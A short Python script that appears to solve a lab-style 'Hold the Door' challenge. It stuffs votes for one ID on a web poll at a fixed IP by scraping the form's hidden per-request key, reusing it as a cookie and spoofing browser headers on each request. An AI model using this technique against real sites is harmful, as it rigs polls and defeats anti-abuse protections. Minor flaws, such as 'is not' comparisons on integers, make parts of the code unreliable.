#!/usr/bin/python3
import urllib
from bs4 import BeautifulSoup

raidsDopeId = '250'
url_page = "http://158.69.76.135/level2.php"
windowsDeathString = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36 Edge/12.0"
payload = {
    'id': raidsDopeId,
    'holdthedoor': 'Submit'
}

def main():
    page = urllib.request.urlopen(url_page)
    pageSoup = BeautifulSoup(page, 'html.parser')
    # print(pageSoup)

    voteCount = find_id_vt_count(pageSoup, raidsDopeId)
    hiddVal = find_hidden_val(pageSoup)
    while voteCount < 1024 and voteCount is not -1:
        
        payload.update({'key': hiddVal})
        encodedPayload = urllib.parse.urlencode(payload)
        # print(payload)

        opener = urllib.request.build_opener()
        opener.addheaders = [
            ('Cookie', 'HoldTheDoor={}'.format(hiddVal)), 
            ('User-Agent', windowsDeathString),
            ('Referer', url_page),
            ('Host', '158.69.76.135'),
            ('Connection', 'keep-alive')
        ]
        results = opener.open(url_page, encodedPayload.encode('utf8'))
        # print(results.info())

        if results.getcode() is not 201 and results.getcode() is not 200:
            print("There was an error requesting for link: {}".format(url_page))
            break

        pageSoup = BeautifulSoup(results, 'html.parser')
        # print(pageSoup)
        tmpVC = find_id_vt_count(pageSoup, raidsDopeId)

        if tmpVC == voteCount:
            # print fail
            print(chr(27) + "[2J")
            print("Vote did not register, check something because you thing is brokedeted")
            break
        else:
            # printing the status of the script via how many votes are successfully sent in
            voteCount = tmpVC
            hiddVal = find_hidden_val(pageSoup)
            print(chr(27) + "[2J")
            print("Vote added, count at: {}".format(tmpVC))
    else:
        print("You tried to run the script without an initial vote and/or are over x amount set in script")


def find_hidden_val(soup):
    """function that returns the rand key generated per req
    """
    return soup.find('input', {'name':'key'})['value']

def find_id_vt_count(soup, id):
    """func that finds voter id and returns how many votes he has
    """
    rows = iter(soup.find('table').find_all('tr'))
    for row in rows:
        row = row.text.split()
        if row[0] == id:
            votecount = int(row[1])
            break
        else:
            votecount = -1
    return votecount

if __name__ == '__main__':
    main()
